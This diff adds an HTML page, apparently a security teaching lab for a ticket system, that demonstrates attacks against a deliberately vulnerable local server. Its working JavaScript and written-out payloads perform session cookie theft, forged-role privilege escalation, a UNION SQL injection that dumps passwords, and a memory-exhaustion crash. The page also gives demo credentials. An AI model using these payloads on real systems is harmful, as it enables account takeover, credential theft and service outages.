@@ -1,0 +1,808 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>CFGS — Vulnerability Demo</title>
+  <link rel="stylesheet" href="css/style.css" />
+  <style>
+    .demo-page { background: #1a1a1a; min-height: 100vh; }
+
+    .demo-navbar {
+      background: #111;
+      border-bottom: 2px solid #c62828;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 28px;
+      height: 60px;
+    }
+    .demo-navbar .brand { display:flex; align-items:center; gap:12px; }
+    .demo-navbar .brand-logo {
+      width:38px; height:38px; background:#c62828; border-radius:50%;
+      display:flex; align-items:center; justify-content:center;
+      font-weight:900; font-size:13px; color:white;
+    }
+    .demo-navbar h1 { color:white; font-size:16px; font-weight:700; }
+    .demo-navbar p  { color:#aaa; font-size:11px; }
+    .demo-navbar a  { color:#aaa; text-decoration:none; font-size:13px; }
+    .demo-navbar a:hover { color:white; }
+
+    .demo-wrapper { max-width: 960px; margin: 0 auto; padding: 32px 20px; }
+
+    .demo-intro {
+      text-align: center;
+      margin-bottom: 36px;
+    }
+    .demo-intro h2 { color: #e53935; font-size: 26px; font-weight: 800; margin-bottom: 8px; }
+    .demo-intro p  { color: #aaa; font-size: 14px; max-width: 600px; margin: 0 auto; }
+
+    .vuln-section {
+      background: #242424;
+      border-radius: 12px;
+      border: 1px solid #333;
+      overflow: hidden;
+      margin-bottom: 28px;
+    }
+
+    .vuln-section-header {
+      background: #c62828;
+      padding: 16px 24px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+    .vuln-section-header .icon {
+      width: 36px; height: 36px;
+      background: rgba(255,255,255,0.15);
+      border-radius: 50%;
+      display: flex; align-items:center; justify-content:center;
+      font-size: 18px;
+      flex-shrink: 0;
+    }
+    .vuln-section-header h3 { color: white; font-size: 16px; font-weight: 700; }
+    .vuln-section-header p  { color: rgba(255,255,255,0.7); font-size: 12px; margin-top:2px; }
+
+    .vuln-section-body { padding: 24px; }
+
+    .explain-box {
+      background: #1a1a1a;
+      border-left: 3px solid #c62828;
+      border-radius: 0 8px 8px 0;
+      padding: 14px 18px;
+      margin-bottom: 20px;
+      font-size: 13px;
+      color: #ccc;
+      line-height: 1.8;
+    }
+    .explain-box strong { color: #ef5350; }
+
+    .step-list { list-style: none; padding: 0; margin: 0 0 20px; }
+    .step-list li {
+      display: flex;
+      gap: 12px;
+      align-items: flex-start;
+      padding: 10px 0;
+      border-bottom: 1px solid #333;
+      font-size: 13px;
+      color: #ccc;
+    }
+    .step-list li:last-child { border-bottom: none; }
+    .step-num {
+      min-width: 26px; height: 26px;
+      background: #c62828;
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 11px; font-weight: 800; color: white;
+      flex-shrink: 0;
+      margin-top: 1px;
+    }
+
+    .code-block {
+      background: #111;
+      border: 1px solid #333;
+      border-radius: 8px;
+      padding: 14px 18px;
+      font-family: 'Courier New', monospace;
+      font-size: 12px;
+      color: #4caf50;
+      margin: 12px 0;
+      white-space: pre;
+      overflow-x: auto;
+    }
+
+    .cookie-live {
+      background: #111;
+      border: 1px solid #444;
+      border-radius: 8px;
+      padding: 12px 16px;
+      font-family: 'Courier New', monospace;
+      font-size: 12px;
+      color: #4caf50;
+      word-break: break-all;
+      min-height: 42px;
+      margin: 12px 0;
+    }
+
+    .attack-btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      padding: 10px 20px;
+      background: #c62828;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 13px;
+      font-weight: 700;
+      cursor: pointer;
+      font-family: inherit;
+      transition: all 0.2s;
+      margin: 4px 4px 4px 0;
+    }
+    .attack-btn:hover { background: #b71c1c; transform: translateY(-1px); }
+    .attack-btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+
+    .result-box {
+      background: #111;
+      border-left: 3px solid #4caf50;
+      border-radius: 0 8px 8px 0;
+      padding: 12px 16px;
+      font-family: 'Courier New', monospace;
+      font-size: 12px;
+      color: #4caf50;
+      margin-top: 12px;
+      white-space: pre-wrap;
+      word-break: break-all;
+      display: none;
+    }
+    .result-box.error { border-left-color: #ef5350; color: #ef5350; }
+
+    .status-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      padding: 4px 12px;
+      border-radius: 20px;
+      font-size: 12px;
+      font-weight: 700;
+    }
+    .status-badge.not-logged-in { background: #333; color: #aaa; }
+    .status-badge.logged-in     { background: rgba(76,175,80,0.2); color: #4caf50; border:1px solid #4caf50; }
+
+    .session-card {
+      background: #1a1a1a;
+      border: 1px solid #333;
+      border-radius: 8px;
+      padding: 16px;
+      margin-bottom: 20px;
+    }
+    .session-card h4 { color: #aaa; font-size: 12px; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 12px; }
+    .session-row { display: flex; justify-content: space-between; align-items: center; padding: 8px 0; border-bottom: 1px solid #2a2a2a; font-size: 13px; }
+    .session-row:last-child { border-bottom: none; }
+    .session-row .label { color: #888; }
+    .session-row .value { color: #eee; font-family: monospace; font-size: 12px; }
+
+    .nav-btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      padding: 8px 16px;
+      background: rgba(255,255,255,0.08);
+      color: #ddd;
+      border: 1px solid #444;
+      border-radius: 8px;
+      font-size: 13px;
+      font-weight: 600;
+      cursor: pointer;
+      text-decoration: none;
+      transition: all 0.2s;
+      font-family: inherit;
+    }
+    .nav-btn:hover { background: rgba(255,255,255,0.14); color: white; }
+
+    hr.section-divider {
+      border: none;
+      border-top: 1px solid #333;
+      margin: 8px 0 20px;
+    }
+  </style>
+</head>
+<body class="demo-page">
+
+  <!-- Demo Navbar -->
+  <div class="demo-navbar">
+    <div class="brand">
+      <div class="brand-logo">CFGS</div>
+      <div>
+        <h1>Vulnerability Demo Lab</h1>
+        <p>Colombo Fort Group Services — Security Research</p>
+      </div>
+    </div>
+    <div style="display:flex;align-items:center;gap:12px">
+      <span id="sessionStatus" class="status-badge not-logged-in">Not logged in</span>
+      <a href="/dashboard.html" class="nav-btn">← Back to System</a>
+    </div>
+  </div>
+
+  <div class="demo-wrapper">
+
+    <div class="demo-intro">
+      <h2>Security Vulnerability Demonstrations</h2>
+      <p>
+        This page demonstrates two real-world vulnerabilities present in the
+        vulnerable version of the CFGS system running on port 3000.
+        Log in to the system first, then run the attacks below.
+      </p>
+    </div>
+
+    <!-- ════════════════════════════════════════════════════════
+         VULNERABILITY A — SESSION HIJACKING
+    ═══════════════════════════════════════════════════════════ -->
+    <div class="vuln-section">
+      <div class="vuln-section-header">
+        <div class="icon">🍪</div>
+        <div>
+          <h3>Vulnerability (A) — Session Hijacking</h3>
+          <p>Cookies are readable by JavaScript · No session timeout · No session regeneration</p>
+        </div>
+      </div>
+      <div class="vuln-section-body">
+
+        <div class="explain-box">
+          <strong>Root cause:</strong> The server sets <code>httpOnly: false</code> on the session
+          cookie. This means any JavaScript on the page — including scripts injected by an attacker
+          via XSS — can read the full cookie value using <code>document.cookie</code>.<br><br>
+          <strong>Impact:</strong> An attacker who steals the cookie string can paste it into their
+          own browser and impersonate the victim without ever knowing their password. The session
+          also never expires (no <code>maxAge</code>), so a stolen token works indefinitely.
+        </div>
+
+        <!-- Live cookie display -->
+        <div class="session-card">
+          <h4>Live Session Info (Readable by JS right now)</h4>
+          <div class="session-row">
+            <span class="label">document.cookie</span>
+            <span class="value" id="cookieValue">—</span>
+          </div>
+          <div class="session-row">
+            <span class="label">httpOnly flag</span>
+            <span class="value" style="color:#ef5350">❌ false — cookie is exposed</span>
+          </div>
+          <div class="session-row">
+            <span class="label">Session timeout</span>
+            <span class="value" style="color:#ef5350">❌ None — never expires</span>
+          </div>
+          <div class="session-row">
+            <span class="label">SameSite</span>
+            <span class="value" style="color:#ef5350">❌ Not set — CSRF risk</span>
+          </div>
+        </div>
+
+        <p style="color:#aaa;font-size:13px;margin-bottom:12px">
+          <strong style="color:#ef5350">How to steal a session (step-by-step):</strong>
+        </p>
+        <ol class="step-list">
+          <li>
+            <div class="step-num">1</div>
+            <div>Log in to <strong style="color:#eee">http://localhost:3000</strong> as
+              <code style="color:#4caf50">employee1 / emp123</code> in Browser A.
+            </div>
+          </li>
+          <li>
+            <div class="step-num">2</div>
+            <div>
+              Open the browser console (F12) and run:<br>
+              <div class="code-block">document.cookie</div>
+              You will see the full <code>connect.sid=…</code> value.
+            </div>
+          </li>
+          <li>
+            <div class="step-num">3</div>
+            <div>Copy the cookie value. Click the button below to copy it automatically:</div>
+          </li>
+          <li>
+            <div class="step-num">4</div>
+            <div>
+              Open <strong style="color:#eee">Browser B</strong> (or Incognito).
+              Go to DevTools → Application → Cookies → <code>http://localhost:3000</code>.
+              Add a new cookie named <code>connect.sid</code> with the copied value.
+            </div>
+          </li>
+          <li>
+            <div class="step-num">5</div>
+            <div>
+              Navigate to <strong style="color:#eee">http://localhost:3000/dashboard.html</strong>.<br>
+              You are now logged in as employee1 — without their password.
+            </div>
+          </li>
+        </ol>
+
+        <div style="margin-top:8px">
+          <button class="attack-btn" onclick="copyCookie()" id="copyCookieBtn">
+            📋 Copy My Session Cookie
+          </button>
+          <span id="copySuccess" style="color:#4caf50;font-size:13px;display:none;margin-left:8px">
+            ✅ Copied to clipboard!
+          </span>
+        </div>
+
+        <div class="result-box" id="cookieResult"></div>
+
+      </div>
+    </div>
+
+    <!-- ════════════════════════════════════════════════════════
+         VULNERABILITY B — PRIVILEGE ESCALATION
+    ═══════════════════════════════════════════════════════════ -->
+    <div class="vuln-section">
+      <div class="vuln-section-header">
+        <div class="icon">🔑</div>
+        <div>
+          <h3>Vulnerability (B) — Privilege Escalation</h3>
+          <p>Backend has no role checks · Role accepted from request body · Frontend-only restrictions</p>
+        </div>
+      </div>
+      <div class="vuln-section-body">
+
+        <div class="explain-box">
+          <strong>Root cause:</strong> Role-based restrictions exist only in the frontend UI
+          (e.g. "Close" buttons are hidden for employees). The backend API endpoints perform
+          <em>no role validation</em> on the server side. Additionally, one endpoint reads
+          the user's role directly from the request body — meaning the client can lie about
+          their role.<br><br>
+          <strong>Impact:</strong> Any authenticated user, regardless of role, can call
+          privileged endpoints directly and perform admin or manager actions.
+        </div>
+
+        <hr class="section-divider" />
+
+        <!-- Attack 1 -->
+        <p style="color:#ef5350;font-weight:700;font-size:14px;margin-bottom:10px">
+          Attack 1 — Close a ticket without manager role
+        </p>
+        <p style="color:#aaa;font-size:13px;margin-bottom:12px">
+          The <code>PUT /api/tickets/:id/close</code> endpoint has no role check.
+          Any logged-in user can call it. The frontend just hides the button for employees.
+        </p>
+        <div class="code-block">fetch('/api/tickets/1/close', { method: 'PUT' })
+  .then(r => r.json()).then(console.log)</div>
+        <button class="attack-btn" onclick="attack_close()">▶ Run: Close Ticket as Employee</button>
+        <div class="result-box" id="result_close"></div>
+
+        <hr class="section-divider" style="margin-top:20px" />
+
+        <!-- Attack 2 -->
+        <p style="color:#ef5350;font-weight:700;font-size:14px;margin-bottom:10px">
+          Attack 2 — Delete a ticket by faking admin role in request body
+        </p>
+        <p style="color:#aaa;font-size:13px;margin-bottom:12px">
+          The <code>DELETE /api/tickets/:id</code> endpoint reads <code>role</code>
+          from <code>req.body</code> instead of <code>req.session</code>. Sending
+          <code>{ "role": "admin" }</code> in the body bypasses the check entirely.
+        </p>
+        <div class="code-block">fetch('/api/tickets/2', {
+  method:  'DELETE',
+  headers: { 'Content-Type': 'application/json' },
+  body:    JSON.stringify({ role: 'admin' })  // ← lying about role!
+}).then(r => r.json()).then(console.log)</div>
+        <button class="attack-btn" onclick="attack_delete()">▶ Run: Delete Ticket with Fake Admin Role</button>
+        <div class="result-box" id="result_delete"></div>
+
+        <hr class="section-divider" style="margin-top:20px" />
+
+        <!-- Attack 3 -->
+        <p style="color:#ef5350;font-weight:700;font-size:14px;margin-bottom:10px">
+          Attack 3 — Access the admin user list without admin role
+        </p>
+        <p style="color:#aaa;font-size:13px;margin-bottom:12px">
+          <code>GET /api/admin/users</code> only checks if the user is logged in —
+          it does not verify whether they are an admin.
+        </p>
+        <div class="code-block">fetch('/api/admin/users')
+  .then(r => r.json()).then(console.log)</div>
+        <button class="attack-btn" onclick="attack_userlist()">▶ Run: Get All Users as Employee</button>
+        <div class="result-box" id="result_userlist"></div>
+
+      </div>
+    </div>
+
+    <!-- ════════════════════════════════════════════════════════
+         VULNERABILITY C — SQL INJECTION
+    ═══════════════════════════════════════════════════════════ -->
+    <div class="vuln-section">
+      <div class="vuln-section-header">
+        <div class="icon">💉</div>
+        <div>
+          <h3>Vulnerability (C) — SQL Injection</h3>
+          <p>User input concatenated directly into query string · UNION attack leaks all passwords</p>
+        </div>
+      </div>
+      <div class="vuln-section-body">
+
+        <div class="explain-box">
+          <strong>Root cause:</strong> The search endpoint builds its query by pasting the user's
+          input directly into a string: <code>WHERE title LIKE '%<em>INPUT</em>%'</code>.<br><br>
+          An attacker closes the string early with <code>'</code> then appends a
+          <code>UNION SELECT</code> statement pointing at the <code>users</code> table.
+          The database executes both statements and returns the combined results — including
+          every username and plaintext password.<br><br>
+          <strong>Impact:</strong> Full credential dump. Anyone who can search can extract
+          every account in the system.
+        </div>
+
+        <p style="color:#ef5350;font-weight:700;font-size:14px;margin-bottom:10px">
+          Step 1 — Normal search (see how it works first)
+        </p>
+        <p style="color:#aaa;font-size:13px;margin-bottom:10px">
+          The search bar on the dashboard calls <code>GET /api/search?q=TERM</code>.
+          The raw SQL query is shown below the search bar on the dashboard. Try searching for <code>wifi</code>.
+        </p>
+        <div class="code-block">GET /api/search?q=wifi
+
+→ Executes: SELECT ... FROM tickets WHERE title LIKE '%wifi%' OR description LIKE '%wifi%'
+→ Returns: matching tickets only ✓</div>
+
+        <hr class="section-divider" />
+
+        <p style="color:#ef5350;font-weight:700;font-size:14px;margin-bottom:10px">
+          Step 2 — Injection attack: dump all user passwords
+        </p>
+        <p style="color:#aaa;font-size:13px;margin-bottom:10px">
+          Paste the payload below into the search box on the dashboard, or click Run Attack.
+          The UNION appends a full select from the <code>users</code> table.
+          Usernames appear as ticket titles, passwords appear as descriptions.
+        </p>
+        <div class="code-block">' UNION SELECT id,username,password,role,name,name,name FROM users --</div>
+        <p style="color:#888;font-size:12px;margin-bottom:10px">
+          The server executes:<br>
+          <code>SELECT ... FROM tickets WHERE title LIKE '%' UNION SELECT id,username,password,role,name,name,name FROM users --%'</code>
+        </p>
+
+        <button class="attack-btn" onclick="attack_sqli_normal()">▶ Run: Normal Search (wifi)</button>
+        <button class="attack-btn" onclick="attack_sqli_inject()">▶ Run: Injection Attack (Dump Passwords)</button>
+        <div class="result-box" id="result_sqli"></div>
+
+      </div>
+    </div>
+
+    <!-- ════════════════════════════════════════════════════════
+         VULNERABILITY D — PING OF DEATH
+    ═══════════════════════════════════════════════════════════ -->
+    <div class="vuln-section">
+      <div class="vuln-section-header">
+        <div class="icon">💀</div>
+        <div>
+          <h3>Vulnerability (D) — Ping of Death</h3>
+          <p>No payload size limit on /api/ping · Oversized packet forces full memory allocation · Server crash</p>
+        </div>
+      </div>
+      <div class="vuln-section-body">
+
+        <div class="explain-box">
+          <strong>Original Ping of Death (network layer):</strong> An attacker sends an ICMP
+          "ping" packet whose total size, when all IP fragments are reassembled, exceeds
+          65,535 bytes — the maximum allowed by the IPv4 specification. The target OS allocates
+          a buffer for the full packet, the buffer overflows, and the system crashes or reboots.<br><br>
+          <strong>Web application equivalent:</strong> This server exposes a <code>POST /api/ping</code>
+          endpoint with <em>no payload size limit</em>. Node.js must buffer the entire request body
+          in heap memory before the handler can run. Sending a large enough payload exhausts
+          available RAM and crashes the process with <em>"JavaScript heap out of memory"</em> —
+          the same outcome as the original attack, just at the application layer instead of the OS.<br><br>
+          <strong>Impact:</strong> Complete server crash, all active users lose their sessions,
+          service is unavailable until the process is manually restarted.
+        </div>
+
+        <!-- How it works diagram -->
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:20px">
+          <div style="background:#1a1a1a;border:1px solid #333;border-radius:8px;padding:14px;font-size:12px;color:#ccc">
+            <div style="color:#ef5350;font-weight:700;margin-bottom:8px">Original (ICMP)</div>
+            Attacker → fragmented ICMP packets → target OS reassembles →
+            total size &gt; 65,535 bytes → buffer overflow → <span style="color:#ef5350">OS crash</span>
+          </div>
+          <div style="background:#1a1a1a;border:1px solid #333;border-radius:8px;padding:14px;font-size:12px;color:#ccc">
+            <div style="color:#ef5350;font-weight:700;margin-bottom:8px">Web Equivalent (HTTP)</div>
+            Attacker → large POST body → Node.js buffers entire body →
+            heap exhausted → <span style="color:#ef5350">process crash</span>
+          </div>
+        </div>
+
+        <p style="color:#ef5350;font-weight:700;font-size:14px;margin-bottom:10px">
+          Step-by-step: How the attack works
+        </p>
+        <ol class="step-list">
+          <li>
+            <div class="step-num">1</div>
+            <div>The server registers <code>POST /api/ping</code> using
+              <code>express.raw({ limit: Infinity })</code> — no size cap at all.</div>
+          </li>
+          <li>
+            <div class="step-num">2</div>
+            <div>Attacker sends a massive HTTP POST body to <code>/api/ping</code>
+              (same concept as a giant ICMP packet).</div>
+          </li>
+          <li>
+            <div class="step-num">3</div>
+            <div>Node.js <strong>must fully buffer the body in heap memory</strong>
+              before the route handler can read even a single byte.</div>
+          </li>
+          <li>
+            <div class="step-num">4</div>
+            <div>With a large enough payload (try 50 MB+) the Node.js heap is exhausted
+              and the process crashes — all sessions lost, server offline.</div>
+          </li>
+        </ol>
+
+        <p style="color:#ef5350;font-weight:700;font-size:14px;margin-bottom:10px">
+          Live attacks — run them in sequence
+        </p>
+
+        <p style="color:#aaa;font-size:13px;margin-bottom:8px">
+          <strong style="color:#eee">Attack 1:</strong> Small ping (64 bytes) — works normally.
+        </p>
+        <div class="code-block">POST /api/ping   body: 64 bytes of 'A'   → server echoes: Pong! (64 bytes read)</div>
+        <button class="attack-btn" onclick="attack_pod(64)">▶ Ping 64 B (Normal)</button>
+        <div class="result-box" id="result_pod_small"></div>
+
+        <hr class="section-divider" style="margin-top:16px" />
+
+        <p style="color:#aaa;font-size:13px;margin-bottom:8px;margin-top:4px">
+          <strong style="color:#eee">Attack 2:</strong> Oversized ping (5 MB) — server buffers the whole thing.
+          On the secure system this returns HTTP 413 immediately.
+        </p>
+        <div class="code-block">POST /api/ping   body: 5,000,000 bytes   → vulnerable server reads ALL of it into RAM</div>
+        <button class="attack-btn" onclick="attack_pod(5 * 1024 * 1024)">▶ Ping 5 MB (Oversized)</button>
+        <div class="result-box" id="result_pod_large"></div>
+
+        <hr class="section-divider" style="margin-top:16px" />
+
+        <p style="color:#aaa;font-size:13px;margin-bottom:8px;margin-top:4px">
+          <strong style="color:#eee">Attack 3:</strong> Fatal ping (50 MB) — may crash the server process.
+          <span style="color:#ef5350">⚠ This may take a few seconds and could kill the server.</span>
+        </p>
+        <div class="code-block">POST /api/ping   body: 50,000,000 bytes   → heap exhaustion → process crash</div>
+        <button class="attack-btn" style="background:#7b0000" onclick="attack_pod(50 * 1024 * 1024)">
+          ▶ Ping 50 MB (Fatal — May Crash Server)
+        </button>
+        <div class="result-box" id="result_pod_fatal"></div>
+
+      </div>
+    </div>
+
+    <!-- Comparison note -->
+    <div style="background:#1e2e1e;border:1px solid #2d5a2d;border-radius:12px;padding:24px;text-align:center">
+      <p style="color:#81c784;font-size:14px;font-weight:600;margin-bottom:8px">
+        Compare with the Secure Version
+      </p>
+      <p style="color:#aaa;font-size:13px;margin-bottom:16px">
+        The secure system (port 3001) blocks all four attack categories:
+        HttpOnly cookies, backend RBAC, parameterized queries, and rate limiting.
+      </p>
+      <a href="http://localhost:3001" target="_blank" class="nav-btn"
+        style="background:#1e5631;border-color:#2d8a4e;color:#a5d6a7">
+        Open Secure System →
+      </a>
+    </div>
+
+  </div><!-- /demo-wrapper -->
+
+  <script>
+    // ── Check session status ─────────────────────────────────
+    async function checkSession() {
+      try {
+        const res = await fetch('/api/me');
+        if (res.ok) {
+          const user = await res.json();
+          const el = document.getElementById('sessionStatus');
+          el.className = 'status-badge logged-in';
+          el.textContent = `● Logged in as ${user.name} (${user.role})`;
+
+          // Show live cookie
+          const cookie = document.cookie;
+          document.getElementById('cookieValue').textContent =
+            cookie ? cookie.substring(0, 80) + (cookie.length > 80 ? '…' : '') : '(empty)';
+        } else {
+          document.getElementById('cookieValue').textContent = 'Not logged in — open /index.html first';
+        }
+      } catch {
+        document.getElementById('cookieValue').textContent = 'Server not reachable';
+      }
+    }
+
+    // ── Cookie copy ──────────────────────────────────────────
+    function copyCookie() {
+      const val = document.cookie;
+      if (!val) {
+        const r = document.getElementById('cookieResult');
+        r.className = 'result-box error';
+        r.style.display = 'block';
+        r.textContent = 'No cookie found. Please log in first at http://localhost:3000';
+        return;
+      }
+      navigator.clipboard.writeText(val).then(() => {
+        document.getElementById('copySuccess').style.display = 'inline';
+        setTimeout(() => document.getElementById('copySuccess').style.display = 'none', 2500);
+
+        const r = document.getElementById('cookieResult');
+        r.className = 'result-box';
+        r.style.display = 'block';
+        r.textContent = 'Copied:\n' + val;
+      });
+    }
+
+    // ── Attack 1: Close ticket (no role check) ───────────────
+    async function attack_close() {
+      const r = document.getElementById('result_close');
+      r.style.display = 'block';
+      r.className = 'result-box';
+      r.textContent = 'Sending request…';
+
+      try {
+        // Get first open ticket
+        const ticketsRes = await fetch('/api/tickets');
+        if (!ticketsRes.ok) { r.className='result-box error'; r.textContent='Not logged in.'; return; }
+        const tickets = await ticketsRes.json();
+        const open = tickets.find(t => t.status === 'open');
+        if (!open) { r.textContent = 'No open tickets to close — create one first.'; return; }
+
+        const res  = await fetch(`/api/tickets/${open.id}/close`, { method: 'PUT' });
+        const data = await res.json();
+
+        r.textContent =
+          `PUT /api/tickets/${open.id}/close\n` +
+          `HTTP ${res.status}\n\n` +
+          JSON.stringify(data, null, 2) + '\n\n' +
+          (data.success ? '✅ SUCCESS — Backend had no role check. Any user can close tickets.' : '❌ Failed: ' + (data.message || ''));
+      } catch(e) {
+        r.className = 'result-box error';
+        r.textContent = 'Error: ' + e.message + '\nMake sure you are logged in.';
+      }
+    }
+
+    // ── Attack 2: Delete ticket with fake role ───────────────
+    async function attack_delete() {
+      const r = document.getElementById('result_delete');
+      r.style.display = 'block';
+      r.className = 'result-box';
+      r.textContent = 'Sending request…';
+
+      try {
+        const ticketsRes = await fetch('/api/tickets');
+        if (!ticketsRes.ok) { r.className='result-box error'; r.textContent='Not logged in.'; return; }
+        const tickets = await ticketsRes.json();
+        const ticket = tickets[0];
+        if (!ticket) { r.textContent = 'No tickets exist — create one first.'; return; }
+
+        const res  = await fetch(`/api/tickets/${ticket.id}`, {
+          method:  'DELETE',
+          headers: { 'Content-Type': 'application/json' },
+          body:    JSON.stringify({ role: 'admin' }),  // Fake admin role!
+        });
+        const data = await res.json();
+
+        r.textContent =
+          `DELETE /api/tickets/${ticket.id}\n` +
+          `Request body: { "role": "admin" }  ← client-controlled\n` +
+          `HTTP ${res.status}\n\n` +
+          JSON.stringify(data, null, 2) + '\n\n' +
+          (data.success ? '✅ SUCCESS — Backend read role from request body, not session.' : '❌ No more tickets to delete — try creating one first.');
+      } catch(e) {
+        r.className = 'result-box error';
+        r.textContent = 'Error: ' + e.message;
+      }
+    }
+
+    // ── Attack 3: Admin user list ─────────────────────────────
+    async function attack_userlist() {
+      const r = document.getElementById('result_userlist');
+      r.style.display = 'block';
+      r.className = 'result-box';
+      r.textContent = 'Sending request…';
+
+      try {
+        const res  = await fetch('/api/admin/users');
+        const data = await res.json();
+
+        if (Array.isArray(data)) {
+          r.textContent =
+            `GET /api/admin/users\n` +
+            `HTTP ${res.status}\n\n` +
+            JSON.stringify(data, null, 2) + '\n\n' +
+            '✅ SUCCESS — Endpoint has no role check. Any logged-in user sees all user data.';
+        } else {
+          r.className = 'result-box error';
+          r.textContent = 'Unexpected response:\n' + JSON.stringify(data, null, 2);
+        }
+      } catch(e) {
+        r.className = 'result-box error';
+        r.textContent = 'Error: ' + e.message;
+      }
+    }
+
+    // ── Attack C: SQL Injection ───────────────────────────────
+    async function attack_sqli_normal() {
+      const r = document.getElementById('result_sqli');
+      r.style.display = 'block'; r.className = 'result-box';
+      r.textContent = 'Sending normal search…';
+      try {
+        const res  = await fetch('/api/search?q=wifi');
+        const data = await res.json();
+        r.textContent =
+          `GET /api/search?q=wifi\nHTTP ${res.status}\n\n` +
+          `Query executed:\n${data.rawQuery}\n\n` +
+          `Results (${data.results.length}):\n` +
+          JSON.stringify(data.results, null, 2);
+      } catch(e) { r.className='result-box error'; r.textContent='Error: '+e.message+'\n(Log in first)'; }
+    }
+
+    async function attack_sqli_inject() {
+      const r = document.getElementById('result_sqli');
+      r.style.display = 'block'; r.className = 'result-box';
+      r.textContent = 'Running SQL injection…';
+      const payload = `' UNION SELECT id,username,password,role,name,name,name FROM users --`;
+      try {
+        const res  = await fetch('/api/search?q=' + encodeURIComponent(payload));
+        const data = await res.json();
+        const credRows = data.results.filter(t => t.createdByName === 'INJECTED' || !t.createdAt || t.status === 'admin' || t.status === 'manager' || t.status === 'employee');
+        r.textContent =
+          `GET /api/search?q=${payload}\nHTTP ${res.status}\n\n` +
+          `Query executed:\n${data.rawQuery}\n\n` +
+          `✅ INJECTION SUCCEEDED — ${data.results.length} rows returned\n\n` +
+          `Leaked credentials (username → title, password → description):\n` +
+          data.results.map(t => `  • ${t.title}  |  password: ${t.description}  |  role: ${t.status}`).join('\n');
+      } catch(e) { r.className='result-box error'; r.textContent='Error: '+e.message+'\n(Log in first)'; }
+    }
+
+    // ── Attack D: Ping of Death ───────────────────────────────
+    async function attack_pod(bytes) {
+      // Pick the right result box
+      const resultId = bytes <= 1024        ? 'result_pod_small'
+                     : bytes <= 10*1024*1024 ? 'result_pod_large'
+                     :                         'result_pod_fatal';
+      const r = document.getElementById(resultId);
+      r.style.display = 'block'; r.className = 'result-box';
+      r.textContent = `Building ${fmt(bytes)} payload…`;
+
+      const payload = new Uint8Array(bytes).fill(0x41); // fill with 'A'
+      r.textContent = `Sending ${fmt(bytes)} ping to POST /api/ping…`;
+
+      try {
+        const start = Date.now();
+        const res   = await fetch('/api/ping', {
+          method:  'POST',
+          headers: { 'Content-Type': 'application/octet-stream' },
+          body:    payload,
+        });
+        const elapsed = Date.now() - start;
+        const data    = await res.json().catch(() => ({}));
+
+        r.textContent =
+          `POST /api/ping  (payload: ${fmt(bytes)})\n` +
+          `HTTP ${res.status}  |  Round-trip: ${elapsed} ms\n\n` +
+          JSON.stringify(data, null, 2) + '\n\n' +
+          (res.status === 200
+            ? `✅ SERVER ACCEPTED ${fmt(bytes)} — it buffered the ENTIRE payload in RAM.\n` +
+              `   This is the web equivalent of the original Ping of Death.\n` +
+              `   On the secure system, POST /api/ping rejects anything over 1 KB with HTTP 413.`
+            : `HTTP ${res.status} — server responded (may have partially failed).`);
+      } catch(e) {
+        r.textContent =
+          `POST /api/ping  (payload: ${fmt(bytes)})\n\n` +
+          `Result: ${e.message}\n\n` +
+          (bytes >= 50*1024*1024
+            ? `⚠️  The server may have crashed (heap out of memory).\n` +
+              `   Try refreshing the page — if it fails to load, restart the server.`
+            : `Network or browser error: ${e.message}`);
+      }
+    }
+
+    function fmt(bytes) {
+      if (bytes >= 1024*1024) return (bytes/1024/1024).toFixed(0) + ' MB';
+      if (bytes >= 1024)      return (bytes/1024).toFixed(0) + ' KB';
+      return bytes + ' B';
+    }
+
+    checkSession();
+  </script>
+</body>
+</html>
